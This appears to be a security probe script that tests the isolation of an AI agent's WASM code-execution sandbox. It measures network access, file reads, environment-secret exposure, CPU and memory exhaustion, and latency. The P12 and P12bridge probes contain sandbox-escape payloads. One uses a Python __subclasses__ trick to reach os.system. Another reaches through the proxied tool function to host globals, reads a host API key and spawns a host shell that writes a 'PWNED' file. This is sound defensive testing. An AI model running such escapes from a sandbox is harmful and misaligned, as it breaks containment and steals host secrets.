"""Symbolica Agentica sandbox probes (SPEC.md P1-P12), no model in the loop.

Runs inside the symbolica-agentica-sandbox:probe image (see docker/Dockerfile) with the
agentica-server venv: `uv run --no-sync python /probe/probe.py <probe> [--mode from_env|wasm]`.

Entry point: agentica-server's own SandboxTestContext (src/sm_testing/sandbox_tst_ctx.py), which
wires a `sandbox.Sandbox` (Rust wasmtime host + CPython-WASI guest) to an agentica_internal
SDKWorld exactly as the server's Agent does (src/agentic/agent.py:130). Code goes in through
Sandbox.repl_run_code, the call the agent loop makes (src/agentic/monads/repl_tool/multi_turn/openai.py:217).
"""

import asyncio
import os
import statistics
import sys
import threading
import time

import psutil

from sm_testing import SandboxTestContext

CALLS = {"n": 0}
# A common tool-module pattern: a credential read from the environment into a module global.
HOST_API_KEY = os.environ.get("PROBE_SECRET")


async def lookup(id: int) -> dict:
    """Look up a value by id."""
    CALLS["n"] += 1
    await asyncio.sleep(0.2)
    return {"id": id, "value": id * 2}


def show(label, info):
    print(f"--- {label}")
    print("output repr (first 600):", repr(info.output[:600]))
    print("len(output):", len(info.output))
    print("out_str:", repr(getattr(info, "out_str", None))[:600])
    print("exception_name:", getattr(info, "exception_name", None))
    print("traceback_str:", repr(getattr(info, "traceback_str", None))[:2000])
    print("has_result:", info.has_result)


async def run(ctxname, mode, code_list, timeout=None):
    async with SandboxTestContext(ctxname, lookup, sb_mode=mode) as sb:
        print("sandbox mode:", sb._mode)
        res = []
        for code in code_list:
            t = time.perf_counter()
            if timeout:
                info = await asyncio.wait_for(sb.repl_run_code(code), timeout)
            else:
                info = await sb.repl_run_code(code)
            res.append((info, (time.perf_counter() - t) * 1000))
        return res


async def main(probe, mode):
    proc = psutil.Process()
    print(f"probe={probe} mode={mode} AGENTICA_NO_SANDBOX={os.environ.get('AGENTICA_NO_SANDBOX')!r} "
          f"PROBE_SECRET set in host: {os.environ.get('PROBE_SECRET') is not None}")
    simple = {
        "P1": ['r = await lookup(id=21)\nprint(r["value"])'],
        "P2": ['print("A"*200000)\n"RETURNED"'],
        "P3": ['import urllib.request\nurllib.request.urlopen("https://example.com", timeout=10).status',
               'import urllib.request\nurllib.request.urlopen("http://example.com", timeout=10).status',
               'import socket\ns = socket.create_connection(("example.com", 443), timeout=10)\nprint(s)',
               'import ssl',
               # skip DNS (the guest lacks the idna codec): raw TCP to example.com's IP (resolved on the host)
               'import socket\ns = socket.socket()\ns.settimeout(10)\ns.connect(("172.66.147.243", 80))\n'
               's.sendall(b"HEAD / HTTP/1.0\\r\\nHost: example.com\\r\\n\\r\\n")\nprint(s.recv(100))'],
        "P4": ['open("/etc/hosts").read()', 'import os\nos.listdir("/")'],
        "P5": ['import os\nprint(repr(os.environ.get("PROBE_SECRET")))\nprint(dict(os.environ))'],
        "P8": ['kept = 7', 'try:\n    print(kept)\nexcept NameError:\n    print("gone")'],
        "P9": ['import asyncio, time\nt = time.time()\nrs = await asyncio.gather(*[lookup(id=i) for i in [1,2,3,4,5]])\n'
               'print(int((time.time()-t)*1000), [x["value"] for x in rs])'],
        "P10": ['x = 1\nraise ValueError("probe-boom")',
                'def f():\n    return int("probe-boom")\nx = 1\nf()'],
        "P12bridge": [
            # Warp handle inside the virtual `lookup`: send raw getattr requests to the host-side SDK world
            'h = [c.cell_contents for c in lookup.__closure__ if type(c.cell_contents).__name__ == "ResourceHandle"][0]\n'
            'print(repr(h), h.kind, h.keys, h.open)',
            'from agentica_internal.warpc.request.request_resource import ResourceGetAttr\n'
            'g = h.hdlr(h, ResourceGetAttr(lookup, "__globals__"))\nprint(type(g))\nprint(repr(g)[:300])',
            'r = g\nfor step in ("realize", "value"):\n    r = getattr(r, step, r)\n    r = r() if callable(r) and step == "realize" else r\n'
            'print(type(r)); hostos = r["os"] if isinstance(r, dict) or hasattr(r, "__getitem__") else None\nprint(hostos)',
            'print(sorted((k, type(v).__name__) for k, v in r.items() if not k.startswith("__")))',
            'print("HOST_API_KEY via __globals__:", r.get("HOST_API_KEY"))',
            'hp = r["psutil"]\nprint(type(hp), hp)\nprint(type(hp.Popen))',
            'p = hp.Popen(["sh", "-c", "echo PWNED-FROM-SANDBOX $(id -un) > /tmp/pwned.txt"])\nprint("host Popen:", p, p.pid)',
            'print(hostos.system("echo PWNED"))',
        ],
        "P12": [
            'subs = ().__class__.__base__.__subclasses__()\n'
            'print(len(subs), [c.__name__ for c in subs if c.__name__ in ("_wrap_close", "Popen")])',
            'w = [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == "_wrap_close"]\n'
            'print(w[0].__init__.__globals__["system"]("echo PWNED") if w else "no _wrap_close")',
            'print(__import__("os").system("echo PWNED"))',
            'import subprocess\nprint(subprocess.run(["echo", "PWNED"], capture_output=True))',
            # bridge-side attempts: does the proxied host function leak host internals?
            'print(type(lookup), type(lookup).__mro__)\nprint(getattr(lookup, "__globals__", "no __globals__"))',
            'print(getattr(lookup, "__code__", "no __code__"))\nprint(getattr(lookup, "__closure__", "no __closure__"))',
            'import sys, platform\nprint(sys.platform, platform.machine(), sys.version)',
        ],
    }
    if probe == "P10":
        async with SandboxTestContext("P10", lookup, sb_mode=mode) as sb:
            for code in simple["P10"]:
                info = await sb.repl_run_code(code)
                show(code.splitlines()[-1], info)
                if info.has_raised_error:
                    raw = await sb.repl_call_method("get_last_exception", fmt="raw")
                    print("what the SDK caller receives (raw Warp bytes of the raised exception):", bytes(raw)[:600])
        return
    if probe in simple:
        n0 = CALLS["n"]
        res = await run(probe, mode, simple[probe], timeout=60)
        if probe == "P12bridge":
            print("host /tmp/pwned.txt exists:", os.path.exists("/tmp/pwned.txt"),
                  open("/tmp/pwned.txt").read() if os.path.exists("/tmp/pwned.txt") else "")
        for i, (info, ms) in enumerate(res):
            show(f"exec {i+1} ({ms:.0f} ms)", info)
            if probe == "P2":
                print("output count of 'A':", info.output.count("A"))
                print("output tail repr:", repr(info.output[-300:]))
                import re
                print("output with A-runs collapsed:", repr(re.sub("A+", lambda m: f"<A*{len(m.group())}>", info.output)))
        print("host lookup calls:", CALLS["n"] - n0)
        return

    if probe in ("P6", "P7"):
        code = "while True: pass" if probe == "P6" else 'a = []\nwhile True: a.append("x" * 10**6)'
        limit_s = 120
        rss_kill = int(os.environ.get("RSS_KILL_BYTES", str(4 * 1024**3)))
        peak = {"rss": 0}
        stop = threading.Event()

        def watch():
            while not stop.is_set():
                r = proc.memory_info().rss
                peak["rss"] = max(peak["rss"], r)
                if r > rss_kill:
                    print(f"KILL: host RSS {r/2**20:.0f} MiB > {rss_kill/2**20:.0f} MiB at "
                          f"{time.perf_counter()-t0:.1f}s; no limit stopped it", flush=True)
                    os._exit(3)
                time.sleep(0.05)

        async with SandboxTestContext(probe + "-sibling", lookup, sb_mode=mode) as sib:
            await sib.repl_run_code("print('sibling ready')")
            async with SandboxTestContext(probe, lookup, sb_mode=mode) as sb:
                print("sandbox mode:", sb._mode)
                base = proc.memory_info().rss
                print(f"baseline host RSS {base/2**20:.0f} MiB")
                t0 = time.perf_counter()
                threading.Thread(target=watch, daemon=True).start()
                task = asyncio.ensure_future(sb.repl_run_code(code))
                # is the host event loop still responsive while guest code runs?
                await asyncio.sleep(2)
                t1 = time.perf_counter()
                await asyncio.sleep(0.1)
                print(f"host loop responsive during run: 0.1 s sleep took {(time.perf_counter()-t1)*1000:.0f} ms")
                s_info = await asyncio.wait_for(sib.repl_run_code("print('sibling alive', 1+1)"), 30)
                print("sibling session during run:", repr(s_info.output))
                try:
                    info = await asyncio.wait_for(asyncio.shield(task), limit_s - 2)
                    el = time.perf_counter() - t0
                    show(f"returned after {el:.1f} s", info)
                except asyncio.TimeoutError:
                    el = time.perf_counter() - t0
                    print(f"NO-LIMIT: still running after {el:.1f} s (harness limit {limit_s} s)")
                    cpu0 = proc.cpu_times()
                    print("closing sandbox (aclose) ...")
                    task.cancel()
                    await sb.aclose()
                    await asyncio.sleep(5)
                    cpu1 = proc.cpu_times()
                    used = (cpu1.user + cpu1.system) - (cpu0.user + cpu0.system)
                    print(f"CPU seconds burned in the 5 s after aclose(): {used:.1f} "
                          f"(~5 means the guest loop is still spinning on a host thread)")
                except BaseException as e:
                    el = time.perf_counter() - t0
                    print(f"EXCEPTION after {el:.1f} s: {type(e).__name__}: {e!r}"[:3000])
                stop.set()
                print(f"peak host RSS {peak['rss']/2**20:.0f} MiB")
                s_info = await asyncio.wait_for(sib.repl_run_code("print('sibling alive after', 2+2)"), 30)
                print("sibling session after:", repr(s_info.output))
        sys.stdout.flush()
        os._exit(0)

    if probe == "P11":
        t = time.perf_counter()
        async with SandboxTestContext("P11", lookup, sb_mode=mode) as sb:
            setup = (time.perf_counter() - t) * 1000
            first = time.perf_counter()
            await sb.repl_run_code("print(2)")
            first = (time.perf_counter() - first) * 1000
            ts = []
            for _ in range(20):
                t = time.perf_counter()
                info = await sb.repl_run_code("print(2)")
                ts.append((time.perf_counter() - t) * 1000)
            assert info.output == "2\n", info.output
        print(f"one-time setup (Sandbox + SDKWorld + repl_init, incl. component load): {setup:.0f} ms")
        print(f"first execution: {first:.1f} ms")
        ts.sort()
        print("20 executions in one session, ms:", [round(x, 1) for x in ts])
        print(f"median {statistics.median(ts):.1f} ms, p90 {ts[17]:.1f} ms")
        fresh = []
        for i in range(10):
            t = time.perf_counter()
            async with SandboxTestContext(f"P11-fresh{i}", lookup, sb_mode=mode) as sb:
                info = await sb.repl_run_code("print(2)")
            fresh.append((time.perf_counter() - t) * 1000)
        fresh.sort()
        print("10 fresh sandboxes (new Sandbox + init + print(2) + close), ms:", [round(x) for x in fresh])
        print(f"fresh median {statistics.median(fresh):.0f} ms, p90 {fresh[8]:.0f} ms")
        return

    raise SystemExit(f"unknown probe {probe}")


if __name__ == "__main__":
    probe = sys.argv[1]
    mode = "from_env"
    if "--mode" in sys.argv:
        mode = sys.argv[sys.argv.index("--mode") + 1]
    asyncio.run(main(probe, mode))
    sys.stdout.flush()
    os._exit(0)
